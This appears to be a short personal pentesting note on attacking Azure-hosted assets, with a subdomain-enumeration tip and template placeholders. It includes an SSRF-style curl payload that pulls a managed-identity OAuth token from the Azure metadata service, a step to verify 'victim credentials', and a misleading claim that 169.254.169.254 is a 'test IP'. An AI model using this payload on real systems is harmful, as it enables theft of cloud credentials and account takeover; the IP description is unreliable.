
#### 📦 - Asset discovery


Subdomain Enumeration: Some VMs hosted in Azure cannot be reached by regular subdomain hunters like gobuster or dirbuster, so use an online service like:
https://pentest-tools.com/information-gathering/find-subdomains-of-domain

Check for vulnerable input parameters in the asset, where you could inject payloads like:

```
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

==Remember that 169.254.169.254 is a test IP that works as a localhost in the cloud.==

#### 🚀 - Credentials
---
Make sure your victim credentials or access is working:
`az account list`
`az login`




1. A
2. B
3. C

---
#### 📦 - B
--- 

#### 🖊️ - C


⚠ Alert 1
⚠ Alert 2
⚠ Alert 3


--- 

 1️⃣ A
 2️⃣ B
 
--- 

❗C


### Properties
---
📆 created   {{30-12-2024}} 20:17
🏷️ tags: #cloud #azure 

---
